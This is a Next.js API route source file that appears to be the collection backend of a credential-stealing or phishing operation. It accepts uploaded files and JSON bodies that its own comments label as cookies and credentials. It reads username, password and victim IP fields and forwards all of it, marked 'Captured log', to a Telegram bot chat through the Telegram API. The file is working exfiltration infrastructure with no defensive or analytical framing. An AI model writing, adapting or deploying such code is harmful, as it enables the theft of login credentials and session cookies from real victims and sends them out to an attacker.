import nextConnect from 'next-connect';
import multer from 'multer';

export const config = { api: { bodyParser: false } };
const upload = multer();
const handler = nextConnect();

handler.use(upload.single('file'));

handler.post(async (req, res) => {
  const telegramToken = process.env.TELEGRAM_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!telegramToken || !chatId) {
    return res.status(500).json({ success: false, message: 'Bot not configured' });
  }
  const botUrl = `https://api.telegram.org/bot${telegramToken}`;

  // 1. File upload (send file content as text message)
  if (req.file) {
    const fileContent = req.file.buffer.toString('utf-8');
    let caption = '';
    if (req.body.ip) caption += `IP: ${req.body.ip}\n`;
    if (req.body.type) caption += `Type: ${req.body.type}\n`;
    caption += `\n${fileContent}`;
    const tgRes = await fetch(`${botUrl}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: caption })
    });
    const tgText = await tgRes.text();
    if (!tgRes.ok) {
      console.error('Telegram API error (file as text):', tgText);
      return res.status(502).json({ success: false, error: tgText });
    }
    return res.status(200).json({ success: true });
  }

  // 2. JSON logs (cookies/credentials/anything else)
  if (req.headers['content-type']?.includes('application/json')) {
    let body = '';
    await new Promise((resolve, reject) => {
      req.on('data', chunk => body += chunk);
      req.on('end', resolve);
      req.on('error', reject);
    });
    let json;
    try {
      json = JSON.parse(body);
    } catch {
      return res.status(400).json({ success: false, message: 'Invalid JSON' });
    }
    const { data, ip, user, pass, type } = json;
    let text = `📥 Captured log\n`;
    if (ip) text += `IP: ${ip}\n`;
    if (type) text += `Type: ${type}\n`;
    if (data) {
      // If data is object, pretty-print
      text += `\n${typeof data === 'object' ? JSON.stringify(data, null, 2) : data}`;
    } else if (user && pass) {
      text += `User: ${user}\nPass: ${pass}`;
    } else {
      text += JSON.stringify(json, null, 2);
    }
    const tgRes = await fetch(`${botUrl}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text })
    });
    const tgText = await tgRes.text();
    if (!tgRes.ok) {
      console.error('Telegram API error (json text):', tgText);
      return res.status(502).json({ success: false, error: tgText });
    }
    return res.status(200).json({ success: true });
  }

  return res.status(400).json({ success: false, message: 'Bad payload' });
});

export default handler;
